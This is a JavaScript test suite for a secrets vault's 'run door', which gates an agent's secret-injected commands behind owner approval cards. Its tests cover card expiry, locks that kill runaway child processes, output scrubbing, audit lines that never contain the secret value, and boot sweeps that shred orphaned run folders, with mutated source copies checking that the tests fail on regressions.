    'round 23: the door hands userTodos.add a structured `facts` (v2) beside `detail`: who, tool, the RAW command (the agent\'s own bytes shown, value-based), the secret\'s { kind, name }+provenance, plain env, reason, hosts, «always», masking — codes, never prose', f);
  ok(!!f && !leaks(JSON.stringify(f), VALUE).length, 'the facts carry no byte of the value — a reference, a display name and a host are not the secret');
  // r27 (by lane wake-approve-card — its r11 acceptance): a run in a LONG working folder — the door's facts carry the folder's
  // whole through the producer's clipFold (folderCut + folderFull; b034bdf64: clipped to 2 000 with no marker, its tail lost)
  { const deep = path.join(w.work, ...Array.from({ length: 140 }, (_, k) => `nested-level-${String(k).padStart(3, '0')}-dir`));
    fs.mkdirSync(deep, { recursive: true });
    const before = added.length, ac2 = new AbortController();
    const p2 = capDoor.run({ caller: w.caller, args: CURLARGS, cwd: deep, signal: ac2.signal });
    let it2 = null; const t2 = Date.now();
    while (!it2 && Date.now() - t2 < 3000) { it2 = added.slice(before).find((x) => x.action && x.action.type === 'vault-run-ask'); if (!it2) await sleep(5); }
    const f2 = it2 && it2.facts;
    ac2.abort(); await p2.catch(() => {});
    const whole = f2 && Array.isArray(f2.folderFull) ? f2.folderFull.join('') : '';
    ok(!!f2 && deep.length > VR.CARD_STRING_MAX && f2.folder.length === VR.CARD_STRING_MAX && f2.folderCut === true && whole.length > VR.CARD_STRING_MAX && whole.endsWith('/nested-level-139-dir') && f2.folderFull.every((c) => c.length <= VR.CARD_STRING_MAX),
      `r27 (by wake-approve-card): a run in a ${deep.length}-character folder — the door's facts carry folderCut + a folderFull that ends at the folder's own tail (b034bdf64: «folder» clipped to ${VR.CARD_STRING_MAX}, no marker, the tail nowhere)`, f2 && { folder: f2.folder.length, cut: f2.folderCut, whole: whole.length }); }
  ok(!!f && (f.always.why === null || VR.ALWAYS_WHY.includes(f.always.why)) && (f.hosts.known || VR.HOSTS_WHY.includes(f.hosts.why)) && VR.MASKING.includes(f.masking) && VR.CARD_SHAPES.includes(f.shape) && f.secrets.every((x) => ['env', 'file', 'stdin', 'arg'].includes(x.as.kind)),
    'every code the door emits is a member of its exported table (the keys wake-approve-card r7 must carry: always.why ∈ ALWAYS_WHY, hosts.why ∈ HOSTS_WHY, masking ∈ MASKING, shape ∈ CARD_SHAPES, as.kind ∈ env/file/stdin/arg)');
  // DETAIL UNCHANGED (the control): the real For-you record keeps today's prose `detail` byte-for-byte — a change to detail (e.g. replacing it with `facts`) fails here and in ③; facts is ADDITIVE
  const real = await runAnswered(w, CURLARGS, { answer: 'deny' });
  const rc = real.card;
  ok(!!rc && /^curl /.test(rc.detail.split('\n')[0]) && /Hosts: api\.example\.com/.test(rc.detail) && /the tool \+ its flags \+ the hosts \+ the secrets; positional arguments may change/.test(rc.detail) && /Folder: /.test(rc.detail),
    'detail stays as today for older clients: the For-you record keeps the full prose `detail` (the command, the hosts, the shape, the folder) unchanged — facts is an ADDITIVE field, never a replacement', rc && rc.detail);
}

console.log('⑬ THE LATE CARD past its life — the 24 h end (said), the lock, the boot reconcile (lane vault-agent-own r20b)');
{
  // the 24 h: a late card with no answer settles from `late` to expired (SAID, not silent) — status done, resolvedFact outcome 'expired'
  const w = await world({ instance: 'cluster', askMs: 40, lateMs: 80 }); openRow(w);
  const e = await runAnswered(w, ENV('env'), { answer: null }); await e.r;
  const card = cardsOf(w)[0];
  ok(!!card && card.action.late, 'the card went late');
  const t = Date.now(); while (Date.now() - t < 400) { const it = w.userTodos.get(card.id); if (it.status !== 'open') break; await sleep(10); }
  const done = w.userTodos.get(card.id);
  ok(done.status === 'done' && done.resolvedBy === 'expired' && done.resolvedFact && done.resolvedFact.late === true && done.resolvedFact.decidedBy === null && !w.door._lateAsks.size, 'round 23 (MAJOR #5): a late card unanswered for 24 h settles resolvedBy="expired" + resolvedFact {late:true, decidedBy:null} (the vault, not a person) and the in-memory late ask is gone', { status: done.status, by: done.resolvedBy, fact: done.resolvedFact });

  // a late DENY settles the card denied; the next run asks (no pass)
  const wd = await world({ instance: 'cluster', askMs: 40 }); openRow(wd);
  const ed = await runAnswered(wd, ENV('env'), { answer: null }); await ed.r;
  const dc = cardsOf(wd)[0];
  const dr = wd.door.answer(dc.action.askId, { answer: 'deny' });
  ok(dr.ok && dr.outcome === 'denied' && !cardsOf(wd).length && !wd.door._lateOnce.size, 'round 20b: a late «deny» settles the card denied, writes no pass');
  const next = await runAnswered(wd, ENV('env'), { answer: 'deny' });
  ok(!!next.card && next.r.code === 'ask_denied', 'round 20b: after a late deny the same shape asks again (no standing pass)');

  // a LOCK ends every late pass and settles every open late card vault_locked (as it does shortAlways)
  const wl = await world({ instance: 'cluster', askMs: 40 }); openRow(wl);
  const a1 = await runAnswered(wl, ENV('env'), { answer: null }); await a1.r;   // a late card, then ALLOWED -> a pass waiting to be consumed
  wl.door.answer(cardsOf(wl)[0].action.askId, { answer: 'once' });
  const a2 = await runAnswered(wl, ENV('env', 'two'), { answer: null }); await a2.r;   // a late card left UNANSWERED
  const openLate = cardsOf(wl)[0];
  ok(wl.door._lateAsks.size === 1 && wl.door._lateOnce.size === 1 && openLate.action.askId === a2.card.action.askId, 'one unanswered late card + one late pass');
  wl.door.onLocked('test');
  const lockedItem = wl.userTodos.get(openLate.id);
  ok(!wl.door._lateAsks.size && !wl.door._lateOnce.size && lockedItem.status === 'done' && lockedItem.resolvedBy === 'vault_locked' && lockedItem.resolvedFact && lockedItem.resolvedFact.late === true && lockedItem.resolvedFact.decidedBy === null, 'round 23 (MAJOR #5): a LOCK settles every open late card resolvedBy="vault_locked" + resolvedFact {late:true, decidedBy:null} and ends every late pass (as it does shortAlways)', { lateAsks: wl.door._lateAsks.size, lateOnce: wl.door._lateOnce.size, by: lockedItem.resolvedBy, fact: lockedItem.resolvedFact });

  // the BOOT reconcile KEEPS a late card (the owner may still allow one run); a LIVE card a dead process left is settled ask-expired
  const wr = await world({ instance: 'cluster', askMs: 40 }); openRow(wr);
  const er = await runAnswered(wr, ENV('env'), { answer: null }); await er.r;   // -> a late card
  const lateId = cardsOf(wr)[0].id;
  const fake = wr.userTodos.add(wr.caller.sessionKey, { origin: 'vault', text: 'x', urgency: 'urgent', kind: 'action', by: 'agent', action: { type: 'vault-run-ask', askId: 'reconcile-live-fake', always: false } });   // an open vault-run-ask card a dead process left (no backing q, not late)
  const fresh = wr.mk();   // a NEW door over the SAME For-you store — a restart
  fresh.reconcile();
  const keptLate = wr.userTodos.get(lateId), deadLive = wr.userTodos.get(fake.id);
  ok(keptLate.status === 'open' && keptLate.action.late === true && fresh._lateAsks.size === 1 && deadLive.status === 'done' && deadLive.resolvedBy === 'ask-expired', 'round 20b: the boot reconcile KEEPS a late card open (re-registered, still answerable) while a LIVE card a dead process left is settled ask-expired', { late: keptLate.status, live: deadLive.status, lateAsks: fresh._lateAsks.size })
}

console.log('⑭ THE RUN OUTPUT IS VALUE-ONLY (lane vault-agent-own r21; fb-93219e801a) — the injected values go, the tool\'s own named fields stay, no byte dropped');
{
  const w = await world(); openRow(w);
  const j = await runAnswered(w, ENV('json'), { answer: 'once' });
  const out = (await j.r).stdout || '';
  ok(/"key":"deadbeefcafef00dba5eba11"/.test(out) && /"use_auth":false/.test(out) && /"ok":true\}/.test(out) && out.trim().endsWith('}'), 'round 21: the tool\'s OWN fields named key / use_auth survive and the one-line JSON is WHOLE (ends "ok":true}) — the value scrubber never name-redacts, never swallows (54f757df redacted key/auth by name and cut the JSON to 1008 bytes)', out.slice(0, 160));
  ok(/"auth":"\[vault:/.test(out) && /"raw":"\[vault:/.test(out) && !leaks(out, VALUE).length, 'round 21: the INJECTED value (raw AND base64) is redacted to [vault:…] in both fields — the value scrubber masks the values and their encodings, nothing of the value leaks', out.slice(0, 200));

  // the held-tail flush on a CUT (the value across the 2 MiB bound): the tail is FLUSHED scrubbed (tailDropped false now), the value never leaks
  const bw = await world(); openRow(bw);
  const e = await runAnswered(bw, ENV('edge'), { answer: 'once' });
  const er = await e.r;
  ok(er.truncated === true && (er.stdout || '').endsWith('[vault:\u2026]') && !leaks((er.stdout || '').slice(-400), VALUE).length, 'round 21 («never drop a byte»): a CUT stream FLUSHES its held tail SCRUBBED (it ends with the [vault:…] placeholder, not a silent drop) and the value split by the 2 MiB cut never leaks', { truncated: er.truncated, tail: (er.stdout || '').slice(-30) });

  // RED CONTROL (the 54f757df behaviour): a door that runs the name-based redactLong over the run output over-redacts the tool's fields and/or swallows the one-line JSON
  const SRC = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
  const FROM = "const outT = { text: parts.out.join(''), redacted: 0 }, errT = { text: parts.err.join(''), redacted: 0 };";
  const nm = SRC.split(FROM).length - 1;
  const mod = nm === 1 ? M.load('src/server/vault-run-door.js', editAnchor(SRC, FROM, "const outT = redactLong(parts.out.join('')), errT = redactLong(parts.err.join(''));", "src/server/vault-run-door.js"), 'nameredact') : null;
  let mout = null;
  if (mod) { const mw = await world({ doorMod: mod }); openRow(mw); const mj = await runAnswered(mw, ENV('json'), { answer: 'once' }); mout = (await mj.r).stdout || ''; }
  ok(nm === 1 && mout && (/"key":"«redacted»"/.test(mout) || !/"ok":true\}/.test(mout)), 'MUTANT «the name-based pass runs over the run output» (the 54f757df behaviour): the patch hits once and the leg goes RED — the tool\'s key field is name-redacted and/or the one-line JSON is swallowed; the shipped door leaves them whole', { keyRedacted: /"key":"«redacted»"/.test(mout || ''), whole: /"ok":true\}/.test(mout || '') });
}

console.log('④ THE LOCK — a lock mid-run ends the child within its bound; the answer is vault_locked');
{
  const w = await world({ killGraceMs: 400 });
  openRow(w);
  const pidFile = path.join(w.work, 'pid.txt');
  const p = runAnswered(w, ENV('hang', pidFile));
  let pid = null; const t0 = Date.now();
  while (!pid && Date.now() - t0 < 5000) { try { pid = Number(fs.readFileSync(pidFile, 'utf8')) || null; } catch { } await sleep(10); }
  ok(!!pid && alive(pid) && runDirs(w).length === 1, 'the child (deaf to SIGTERM) runs, its run folder beside it', pid);
  const armed = w.timerLog.length;
  w.vault.lock('door');
  const { r } = await p;
  const killed = runLines(w).find((x) => x.outcome === 'vault_locked' && x.killed === true);
  ok(r.code === 'vault_locked' && r.killed === true && /already been told/.test(r.words) && !alive(pid) && w.timerLog.slice(armed).includes(400) && killed && killed.signal === 'SIGKILL',
    'a LOCK mid-run: the child (deaf to SIGTERM) is GONE within its bound — the lock armed the 400 ms grace and the SIGKILL after it ended the child (its line says signal SIGKILL); the agent\'s answer is vault_locked (the user was told)', { code: r.code, killed: r.killed, signal: killed && killed.signal, alive: alive(pid), timers: w.timerLog.slice(armed) });
  ok(!runDirs(w).length && !!killed, 'its run folder is gone; its audit line says vault_locked, killed');
  ok(JSON.stringify(w.vault.blockedSummary()).includes('Lane X'), 'the owner\'s For-you list of who the lock stopped names the conversation (the vault\'s one helper)', w.vault.blockedSummary());
  const lockedRun = await w.door.run({ caller: w.caller, args: ENV('env'), cwd: w.work });
  ok(lockedRun.code === 'vault_locked' && !cardsOf(w).length, 'a LOCKED vault refuses a run FIRST — no card, nothing read', lockedRun.code);
  // a lock with a card up
  await w.vault.unlock(PW);
  const c = w.door.run({ caller: w.caller, args: ENV('env', 'card-up'), cwd: w.work });
  await waitCard(w);
  w.vault.lock('agent');
  ok((await c).code === 'vault_locked' && !cardsOf(w).length, 'a lock while a card is up settles it: vault_locked, the card closes');
  await w.vault.unlock(PW);
  const after = await runAnswered(w, ENV('env'));
  ok(!!after.card && after.r.ok, 'after the lock the SEEN shapes are forgotten — the same shape asks again (the lock ends the unlock\'s allowances)', [!!after.card, after.r.by]);
}

console.log('⑤ THE AUDIT — one line per run and refusal, never a value');
/** THE LEG the audit mutant is judged by: a run, then every byte the door wrote — the audit, the For-you store, its own store. */
async function auditClean(doorMod) {
  const w = await world({ doorMod });
  openRow(w);
  const { r } = await runAnswered(w, ENV('env'));
  const files = ['vault-audit.jsonl', 'user-todos.json', DOOR.STORE_FILE].map((f) => { try { return fs.readFileSync(path.join(w.dataDir, f), 'utf8'); } catch { return ''; } }).join('\n');
  return { ran: !!(r && r.ok), receipt: r && r.receipt, leaks: leaks(files, VALUE), lines: runLines(w) };
}
{
  const a = await auditClean(DOOR);
  const ran = a.lines.find((x) => x.outcome === 'ran');
  ok(a.ran && !a.leaks.length, 'every byte the door wrote (data/vault-audit.jsonl, data/user-todos.json, data/vault-run.json) — the oracle finds NO value', a.leaks);
  ok(!!ran && ran.by.kind === 'agent' && ran.by.name === 'Lane X' && ran.entries[0] === 'vault://mounts/m1/secretKey' && /^[0-9a-f]{16}$/.test(ran.shapeId) && ran.exit === 3 && ran.allowedBy === 'once' && ran.scrubbed.bytes > 0 && ran.scrubbed.hits > 0 && Array.isArray(ran.injection) && typeof ran.cmd === 'string' && typeof ran.ms === 'number' && /\[vault:mounts\/m1\/secretKey\]/.test(ran.stdout),
    'the run\'s line: the actor, the entries (references), the shape, the injection, the command, what allowed it, the exit code, the time, the scrubbed bytes, the scrubbed head of the output', ran);
  ok(/^vr-[0-9a-f]{16}$/.test(ran.receipt) && a.receipt === ran.receipt, 'the agent\'s answer and the audit line carry ONE receipt (design D1: a use + a receipt)', [a.receipt, ran.receipt]);
  ok(!('withheld' in ran.scrubbed), 'a run whose scrubbing stayed within its work bound carries no `withheld` on its line (主开发 r1216: the field is the fact, said only when met)', ran.scrubbed);
}
// THE OWNER'S RECORD OF THE WORK BOUND (主开发 r1216): a run whose scrubbing met its work bound says so — ONE field, `withheld:
// 'scrub_work_bound'`, on the audit line and in the answer. The door's own figure is out of a fast leg's reach (an ordinary output
// never meets it), so the door plants a turn's figure of 64 steps on its scrubber worker (its seam `scrubSteps`).
const SRCD = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8'), SRCW = fs.readFileSync(path.join(REPO, 'src/server/vault-run-scrub-worker.js'), 'utf8');
const doorCopy = (from, to, tag) => M.load('src/server/vault-run-door.js', (Array.isArray(from) ? from : [[from, to]]).reduce((t, [f, x], k) => anchored(t, f, x, `${tag} (${k + 1})`), SRCD), tag.replace(/\W+/g, '-'));   // one edit, or a list of [from, to] pairs
const workerCopy = (from, to, tag) => M.write('src/server/vault-run-scrub-worker.js', anchored(SRCW, from, to, tag), tag.replace(/\W+/g, '-'));
const SMALL = { scrubSteps: { push: 64, run: 1 << 30 } };
{
  const boundLeg = async (mod) => {
    const wb = await world({ doorMod: mod, doorExtra: SMALL }); openRow(wb);
    const { r } = await runAnswered(wb, ENV('env'));
    const ran = runLines(wb).find((x) => x.outcome === 'ran'), out = (r && (r.stdout || '') + (r.stderr || '')) || '';
    return { ok: !!(r && r.ok), said: out.includes('(scrub_work_bound)]'), answer: r && r.scrubbed ? r.scrubbed.withheld : null, line: ran && ran.scrubbed ? ran.scrubbed.withheld : null, leaks: leaks(out, VALUE).length, live: wb.door.scrubLive() };
  };
  const rb = await boundLeg(DOOR);
  ok(rb.ok && rb.said && rb.answer === 'scrub_work_bound' && rb.line === 'scrub_work_bound' && rb.leaks === 0 && rb.live === 0, 'THE OWNER\'S RECORD: a run whose scrubbing met its work bound (a planted figure) — the output says so by name, the answer and the audit line each carry `withheld: \'scrub_work_bound\'`, nothing of the value in the output', rb);
  const rg = await boundLeg(doorCopy("...(e.lost ? { withheld: 'scrub_worker_gone' } : c.over ? { withheld: 'scrub_work_bound' } : {}) };", "...(e.lost ? { withheld: 'scrub_worker_gone' } : {}) };", 'the work bound not on the record'));
  ok(rg.said && !rg.line && !rg.answer, 'MUTANT «the work bound not on the record»: the patch hits once and the leg goes RED — the output said the words, the audit line and the answer carry no `withheld`; the shipped door writes the one field', rg);
}

// THE SCAN OFF THE LOOP's legs (one scrubber worker a run — 主开发 r1505 / r1573 / r1919 / r2161) are scripts/test-vault-run-offloop.mjs,
// their own fast suite and row since 主开发 r2322 «THE COST». The work bound's record (above) stays here.

console.log('⑥b A RUN ENDS WHOLE; the store\'s mark; the bounds; the program on the card (the security review)');
{
  const w = await world({ killGraceMs: 300 });
  openRow(w);
  const bgPid = path.join(w.work, 'bg.txt'), strayPid = path.join(w.work, 'stray.txt');
  const bg = await runAnswered(w, ENV('bg', bgPid));
  const st = await runAnswered(w, ENV('stray', strayPid));
  const pb = Number(fs.readFileSync(bgPid, 'utf8')), ps = Number(fs.readFileSync(strayPid, 'utf8'));
  await sleep(30);
  const strayLine = runLines(w).filter((x) => x.outcome === 'ran').pop();
  ok(bg.r.ok && st.r.ok && !alive(pb) && !alive(ps) && strayLine.strays >= 1, 'a child left behind in the run\'s group, and one in its OWN session deaf to SIGTERM (it carried the run\'s mark), are both GONE when the run ends — the audit counts the stray', { bg: alive(pb), stray: alive(ps), strays: strayLine.strays });
  // on a lock: the setsid'd stray of a run still running
  const lw = await world({ killGraceMs: 300 });
  openRow(lw);
  const p2 = path.join(lw.work, 'stray2.txt'), hold = path.join(lw.work, 'hold.txt');
  const run = runAnswered(lw, ['--env', 'T=vault://mounts/m1/secretKey', '--', NODE, '-e', `const k=require('child_process').spawn(process.execPath,['-e','process.on("SIGTERM",()=>{});setInterval(()=>{},1000)'],{detached:true,stdio:'ignore'});require('fs').writeFileSync(${JSON.stringify(p2)},String(k.pid));k.unref();require('fs').writeFileSync(${JSON.stringify(hold)},'1');setInterval(()=>{},1000)`]);
  for (let i = 0; i < 300 && !fs.existsSync(hold); i++) await sleep(10);
  const sp = Number(fs.readFileSync(p2, 'utf8'));
  ok(alive(sp) && runDirs(lw).length === 1, 'a run whose child left a stray in its own session runs');
  lw.vault.lock('door');
  const dirsAtLock = runDirs(lw).length;
  const lr = (await run).r;
  // the stray is SIGKILLed before the answer; its REAPING is its new parent's (the user's systemd) a moment later — measured:
  // state R, parent systemd, gone ≤ 10 ms; checked at once it read alive 2 runs in 5 on the base. A bounded wait (as the leg
  // above sleeps 30 ms): a stray never killed (deaf to SIGTERM, an endless timer) is still alive after it ⇒ still RED
  for (let i = 0; i < 200 && alive(sp); i++) await sleep(10);
  ok(lr.code === 'vault_locked' && !alive(sp) && dirsAtLock === 0, 'a LOCK: the run\'s files are shredded AT ONCE, its child and the stray in its own session (deaf to SIGTERM) are gone, the answer vault_locked', { code: lr.code, stray: alive(sp), dirsAtLock });
  // a grandchild holding the pipes mid-value: cut after 2 s — half a value never flushed
  const hw = await world();
  openRow(hw);
  const ph = await runAnswered(hw, ENV('pipehold'));
  ok(ph.r.ok && hw.timerLog.includes(300) && !(ph.r.stdout || '').includes(VALUE.slice(0, 10)) && !leaks(ph.r.stdout, VALUE).length, 'a grandchild in its own session holds the pipes and prints HALF the value: the pipes are cut a grace after the child\'s exit (2 s; 300 ms here) and the held half is DROPPED, never flushed', JSON.stringify(ph.r.stdout));
  // THE BOOT SWEEP: a GONE hub's folder (its marked stray ended, its files shredded); a LIVE hub's folder kept
  const sw = await world();
  const deadHub = require('child_process').spawnSync(NODE, ['-e', 'console.log(JSON.stringify(require(' + JSON.stringify(path.join(REPO, 'src/proc-identity.js')) + ').identityOf(process.pid)))'], { encoding: 'utf8' });
  const deadId = JSON.parse(deadHub.stdout);
  const liveKid = require('child_process').spawn(NODE, ['-e', 'setInterval(()=>{},1000)'], { stdio: 'ignore' });
  const liveId = R('src/proc-identity.js').identityOf(liveKid.pid);
  const mkRunDir = (name, owner) => { const d = path.join(sw.runRoot, name); fs.mkdirSync(d, { mode: 0o700 }); fs.writeFileSync(path.join(d, DOOR.OWNER_FILE), JSON.stringify(owner)); fs.writeFileSync(path.join(d, 'f0'), VALUE, { mode: 0o600 }); return d; };
  const gone = mkRunDir(DOOR.RUN_DIR_PREFIX + 'gone01', deadId), kept = mkRunDir(DOOR.RUN_DIR_PREFIX + 'live01', liveId);
  const orphan = require('child_process').spawn(NODE, ['-e', 'process.on("SIGTERM",()=>{}); setInterval(()=>{},1000)'], { env: { ...process.env, [DOOR.MARK_ENV]: DOOR.RUN_DIR_PREFIX + 'gone01' }, stdio: 'ignore', detached: true });
  await sleep(80);
  const n = sw.door.sweep();
  await sleep(30);
  ok(n === 1 && !fs.existsSync(gone) && fs.existsSync(kept) && fs.existsSync(path.join(kept, 'f0')) && !alive(orphan.pid), 'the BOOT SWEEP: the folder of a hub that is GONE is shredded after its marked orphan child (deaf to SIGTERM) is ended; the folder of a hub that LIVES (another hub on the box) is never touched', { n, gone: fs.existsSync(gone), kept: fs.existsSync(kept), orphan: alive(orphan.pid) });
  // r1152 — A SWEEP REMOVES ONLY WHAT IT CAN PROVE IS ITS OWN DEAD THING: a folder of the door's name that carries NO owner mark
  // is not the door's to judge (another program's, a suite's scratch, a second hub's before its mark) — LEFT, its file untouched;
  // beside it a MARKED folder of a dead owner is still shredded and a live one's kept (the plant proves itself before the sweep)
  const unmarked = path.join(sw.runRoot, DOOR.RUN_DIR_PREFIX + 'nomark01'); fs.mkdirSync(unmarked, { mode: 0o700 }); fs.writeFileSync(path.join(unmarked, 'f0'), 'not the door\'s');
  const gone2 = mkRunDir(DOOR.RUN_DIR_PREFIX + 'gone02', deadId);
  const planted = fs.existsSync(path.join(unmarked, 'f0')) && !fs.existsSync(path.join(unmarked, DOOR.OWNER_FILE)) && fs.existsSync(path.join(gone2, DOOR.OWNER_FILE));
  const n2 = sw.door.sweep();
  ok(planted && n2 === 1 && fs.existsSync(unmarked) && fs.readFileSync(path.join(unmarked, 'f0'), 'utf8') === 'not the door\'s' && !fs.existsSync(gone2) && fs.existsSync(kept),
    'r1152: the sweep removes only what it can PROVE is its own dead thing — a folder of its name with NO owner mark is LEFT (its file untouched); a marked folder of a dead owner is shredded; a live owner\'s is kept', { planted, n2, unmarked: fs.existsSync(unmarked), gone2: fs.existsSync(gone2), kept: fs.existsSync(kept) });
  // RED — today's sweep (an anchored copy without the «no mark ⇒ left» line) takes the unmarked folder
  {
    const SRCs = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
    const NEWB = "      if (!owner || typeof owner !== 'object' || !Number.isInteger(Number(owner.pid))) continue;\n      // this hub's own run is its pid AND its start: a container restarted under the same small pid is NOT this hub, so its dead\n      // folder is judged, never kept forever by the pid alone — and ANOTHER hub that lives (or one that cannot be proven gone)\n      // keeps its runs (the review)\n      if (PI.aliveIdentity(owner) !== false) continue;\n";
    const OLDB = "      if (owner && Number(owner.pid) === process.pid) continue;   // this hub's own run\n      if (owner && PI.aliveIdentity(owner) !== false) continue;\n";
    const oldSweep = M.load('src/server/vault-run-door.js', anchored(SRCs, NEWB, OLDB, 'test-vault-run ⑥b r1152 sweep-unmarked (the release\'s two lines)'), 'r1152-sweep-unmarked');
    const ow = await world({ doorMod: oldSweep });
    const um = path.join(ow.runRoot, DOOR.RUN_DIR_PREFIX + 'nomark02'); fs.mkdirSync(um, { mode: 0o700 }); fs.writeFileSync(path.join(um, 'f0'), 'not the door\'s');
    const before = fs.existsSync(path.join(um, 'f0'));
    const nr = ow.door.sweep();
    ok(before && nr === 1 && !fs.existsSync(um), 'RED — today\'s sweep (the copy\'s plant proves itself: the unmarked folder was there): it SHREDS the unmarked folder of its name — the leg above goes red there', { before, nr, left: fs.existsSync(um) });
    // THIS HUB'S OWN RUN IS ITS PID AND ITS START: a folder marked with this very pid but ANOTHER start (a container restarted
    // under the same small pid) is a dead thing — shredded; this hub's real own folder is kept
    const me = R('src/proc-identity.js').identityOf(process.pid);
    const recycledOf = (w) => { const d = path.join(w.runRoot, DOOR.RUN_DIR_PREFIX + 'recycled01'); fs.mkdirSync(d, { mode: 0o700 }); fs.writeFileSync(path.join(d, DOOR.OWNER_FILE), JSON.stringify({ ...me, starttime: (Number(me && me.starttime) || 1) + 987654 })); fs.writeFileSync(path.join(d, 'f0'), VALUE, { mode: 0o600 }); return d; };
    const mineOf = (w) => { const d = path.join(w.runRoot, DOOR.RUN_DIR_PREFIX + 'mine01'); fs.mkdirSync(d, { mode: 0o700 }); fs.writeFileSync(path.join(d, DOOR.OWNER_FILE), JSON.stringify(me)); return d; };
    const rw = await world(), rec = recycledOf(rw), mine = mineOf(rw);
    const n3 = rw.door.sweep();
    ok(!!me && me.starttime != null && n3 === 1 && !fs.existsSync(rec) && fs.existsSync(mine), 'r1152: this hub\'s own run is its pid AND its start — a folder marked with this pid but another start (a recycled pid) is shredded as the dead thing it is; this hub\'s real own folder is kept', { start: me && me.starttime, n3, recycled: fs.existsSync(rec), mine: fs.existsSync(mine) });
    const pidOnly = M.load('src/server/vault-run-door.js', anchored(SRCs, "      if (PI.aliveIdentity(owner) !== false) continue;\n", "      if (Number(owner.pid) === process.pid) continue;\n      if (PI.aliveIdentity(owner) !== false) continue;\n", 'test-vault-run ⑥b r1152 own-by-pid-only'), 'r1152-own-by-pid-only');
    const pw = await world({ doorMod: pidOnly }), rec2 = recycledOf(pw);
    const np = pw.door.sweep();
    ok(fs.existsSync(path.join(rec2, DOOR.OWNER_FILE)) && np === 0 && fs.existsSync(rec2), 'RED — a sweep that keeps «this hub\'s own run» by the pid alone (its plant proves itself: the recycled folder carries its mark): the dead folder is KEPT forever — the leg above goes red there', { np, kept: fs.existsSync(rec2) });
    // THE MARK GOES LAST: shredding a dead folder unlinks every other file first and the mark last (a hub ended mid-shred leaves a
    // marked folder the next sweep finishes; a mark shredded first would leave its values unmarked forever)
    const unlinkOrder = async (doorMod) => {
      const w = await world({ doorMod });
      const d = path.join(w.runRoot, DOOR.RUN_DIR_PREFIX + 'gone03'); fs.mkdirSync(d, { mode: 0o700 });
      fs.writeFileSync(path.join(d, DOOR.OWNER_FILE), JSON.stringify(deadId)); fs.writeFileSync(path.join(d, 'f0'), VALUE, { mode: 0o600 }); fs.writeFileSync(path.join(d, 'f1'), VALUE, { mode: 0o600 });
      const order = [], un0 = fs.unlinkSync;
      fs.unlinkSync = function (p, ...rest) { try { if (String(p).startsWith(d + path.sep)) order.push(path.basename(String(p))); } catch { } return un0.call(this, p, ...rest); };
      let n = null; try { n = w.door.sweep(); } finally { fs.unlinkSync = un0; }
      return { n, order, gone: !fs.existsSync(d) };
    };
    const ul = await unlinkOrder(DOOR);
    ok(ul.n === 1 && ul.gone && ul.order.length === 3 && ul.order[2] === DOOR.OWNER_FILE, 'r1152: a dead folder is shredded MARK LAST — every value file first, then .owner, then the folder', ul);
    const FOR_LINE = "  for (const n of names) if (n !== OWNER_FILE) shredEntry(path.join(dir, n));\n", MARK_ANY = "  if (names.includes(OWNER_FILE)) shredFile(path.join(dir, OWNER_FILE));\n", LEFT_LINE = "  if (left && left.length === 1 && left[0] === OWNER_FILE) shredFile(path.join(dir, OWNER_FILE));\n";   // stale-pins: kept (MARK_ANY is the r1152 line, a RED's replacement — gone from the door on purpose)
    const markFirst = M.load('src/server/vault-run-door.js', anchored(anchored(SRCs, FOR_LINE, MARK_ANY + FOR_LINE, 'test-vault-run ⑥b r1152 mark-first'), LEFT_LINE, '', 'test-vault-run ⑥b r1152 mark-first (its last line)'), 'r1152-mark-first');
    const ulR = await unlinkOrder(markFirst);
    ok(ulR.n === 1 && ulR.order.length === 3 && ulR.order[0] === DOOR.OWNER_FILE, 'RED — a shred that takes the mark FIRST (its plant proves itself: three files were unlinked): the mark-last leg goes red there', ulR);
    // r1213 (a): THE MARK GOES ONLY WHEN NOTHING ELSE IS LEFT (the folder read again) — a file whose unlink failed, or what the run's
    // program left deeper than one level, keeps the folder MARKED, so the next start's sweep judges it again (an unmarked folder with
    // something in it would be kept for ever by the law). r1275 (2): a sub-folder the program made is shredded ONE level down — a value
    // copied into it is overwritten and gone, and the folder with it
    const leftOf = async (doorMod) => {
      const w = await world({ doorMod });
      const d = path.join(w.runRoot, DOOR.RUN_DIR_PREFIX + 'gone04'); fs.mkdirSync(d, { mode: 0o700 });
      fs.writeFileSync(path.join(d, DOOR.OWNER_FILE), JSON.stringify(deadId)); for (const f of ['f0', 'f1']) fs.writeFileSync(path.join(d, f), VALUE, { mode: 0o600 });
      const sd = path.join(w.runRoot, DOOR.RUN_DIR_PREFIX + 'gone05'); fs.mkdirSync(path.join(sd, 'made-by-the-program', 'deeper'), { recursive: true, mode: 0o700 });
      fs.writeFileSync(path.join(sd, DOOR.OWNER_FILE), JSON.stringify(deadId)); fs.writeFileSync(path.join(sd, 'f0'), VALUE, { mode: 0o600 }); fs.writeFileSync(path.join(sd, 'made-by-the-program', 'deeper', 'x'), 'two levels down');
      const od = path.join(w.runRoot, DOOR.RUN_DIR_PREFIX + 'gone06'); fs.mkdirSync(path.join(od, 'made-by-the-program'), { recursive: true, mode: 0o700 });
      fs.writeFileSync(path.join(od, DOOR.OWNER_FILE), JSON.stringify(deadId)); fs.writeFileSync(path.join(od, 'f0'), VALUE, { mode: 0o600 }); fs.writeFileSync(path.join(od, 'made-by-the-program', 'copy-of-f0'), VALUE, { mode: 0o600 });
      const outside = path.join(w.dir, 'outside-the-run.txt'); fs.writeFileSync(outside, 'keep me'); fs.symlinkSync(outside, path.join(od, 'made-by-the-program', 'link-out'));   // a link inside the sub-folder: never followed
      const un0 = fs.unlinkSync, op0 = fs.openSync; let refused = 0, copyOverwritten = false;
      fs.unlinkSync = function (q, ...rest) { if (String(q) === path.join(d, 'f1')) { refused++; throw Object.assign(new Error('EBUSY (the leg refuses this one unlink)'), { code: 'EBUSY' }); } return un0.call(this, q, ...rest); };
      fs.openSync = function (q, flags, ...rest) { if (String(q) === path.join(od, 'made-by-the-program', 'copy-of-f0') && typeof flags === 'number' && (flags & fs.constants.O_WRONLY)) copyOverwritten = true; return op0.call(this, q, flags, ...rest); };   // shredFile overwrites before it unlinks
      let n1 = null; try { n1 = w.door.sweep(); } finally { fs.unlinkSync = un0; fs.openSync = op0; }
